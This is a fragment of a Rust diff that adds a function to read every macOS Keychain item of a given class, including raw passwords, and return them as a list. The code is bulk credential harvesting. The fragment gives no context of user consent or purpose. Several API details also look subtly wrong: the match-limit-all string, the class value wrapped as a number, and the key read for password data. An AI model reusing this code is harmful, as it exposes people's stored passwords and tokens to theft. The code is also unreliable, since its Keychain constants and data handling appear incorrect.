+    let k_return_data = cf_str("r_Data").ok_or_else(|| anyhow!("failed to create kSecReturnData CFString"))?;
+    let _k_data_guard = CfGuard::new(k_return_data as *const c_void);
+
+    let k_match_limit = cf_str("m_Limit").ok_or_else(|| anyhow!("failed to create kSecMatchLimit CFString"))?;
+    let _k_limit_guard = CfGuard::new(k_match_limit as *const c_void);
+
+    // kSecMatchLimitAll = "m_LAll" as a CFStringRef.
+    let v_match_all = cf_str("m_LAll").ok_or_else(|| anyhow!("failed to create kSecMatchLimitAll CFString"))?;
+    let _v_limit_guard = CfGuard::new(v_match_all as *const c_void);
+
+    // kSecClass value: wrap the four-char code in a CFNumber.
+    let v_class = unsafe {
+        CFNumberCreate(K_CF_ALLOCATOR_DEFAULT, 4i32 /* kCFNumberSInt32Type */, &sec_class_fourcc as *const u32 as *const c_void)
+    };
+    if v_class.is_null() {
+        return Err(anyhow!("CFNumberCreate for kSecClass returned null"));
+    }
+    let _v_class_guard = CfGuard::new(v_class as *const c_void);
+
+    // kCFBooleanTrue for kSecReturnAttributes and kSecReturnData.
+    let v_true = kcf_boolean_true();
+
+    // Build query dictionary: { class → fourcc, returnAttrs → true,
+    // returnData → true, matchLimit → all }.
+    let keys: [*const c_void; 4] = [
+        k_class as *const c_void,
+        k_return_attrs as *const c_void,
+        k_return_data as *const c_void,
+        k_match_limit as *const c_void,
+    ];
+    let values: [*const c_void; 4] = [
+        v_class as *const c_void,
+        v_true as *const c_void,
+        v_true as *const c_void,
+        v_match_all as *const c_void,
+    ];
+
+    let query = unsafe {
+        CFDictionaryCreate(
+            K_CF_ALLOCATOR_DEFAULT,
+            keys.as_ptr(),
+            values.as_ptr(),
+            keys.len() as isize,
+            kCFTypeDictionaryKeyCallBacks,
+            kCFTypeDictionaryValueCallBacks,
+        )
+    };
+    if query.is_null() {
+        return Err(anyhow!("CFDictionaryCreate returned null"));
+    }
+    let _query_guard = CfGuard::new(query as *const c_void);
+
+    // Execute the query.
+    let mut result: CFTypeRef = ptr::null();
+    let status = unsafe { SecItemCopyMatching(query, &mut result) };
+    if status != ERR_SEC_SUCCESS {
+        // No items found is not an error — return empty.
+        if status == -25300 /* errSecItemNotFound */ {
+            return Ok(Vec::new());
+        }
+        return Err(anyhow!("SecItemCopyMatching failed with OSStatus {}", status));
+    }
+    let _result_guard = CfGuard::new(result);
+
+    // Result should be a CFArray of CFDictionary items.
+    let array = result as CFArrayRef;
+    let count = unsafe { CFArrayGetCount(array) };
+
+    let mut entries = Vec::new();
+    for i in 0..count {
+        let item = unsafe { CFArrayGetValueAtIndex(array, i) };
+        if item.is_null() {
+            continue;
+        }
+        let dict = item as CFDictionaryRef;
+
+        let mut entry = KeychainEntry {
+            service: dict_get_string(dict, "svce")
+                .or_else(|| dict_get_string(dict, "srvr"))
+                .unwrap_or_default(),
+            account: dict_get_string(dict, "acct").unwrap_or_default(),
+            password: None,
+            entry_type,
+            label: dict_get_string(dict, "labl"),
+            creation_date: dict_get_string(dict, "cdat"),
+            modification_date: dict_get_string(dict, "mdat"),
+            access_group: dict_get_string(dict, "agrp"),
+        };
+
+        // Extract password data.  When kSecReturnData is true and the
+        // keychain is unlocked, SecItemCopyMatching embeds a CFDataRef
+        // containing the raw password bytes in each result dictionary
+        // under the key referenced by kSecReturnData.  We already
+        // requested it above; check for a "data" key or re-query
+        // individually if needed.
+        if let Some(pw) = dict_get_string(dict, "data") {
+            if !pw.is_empty() {
+                entry.password = Some(pw);
+            }
+        }
+
+        if !entry.service.is_empty() || !entry.account.is_empty() {
+            entries.push(entry);
+        }
     }
 
     Ok(entries)
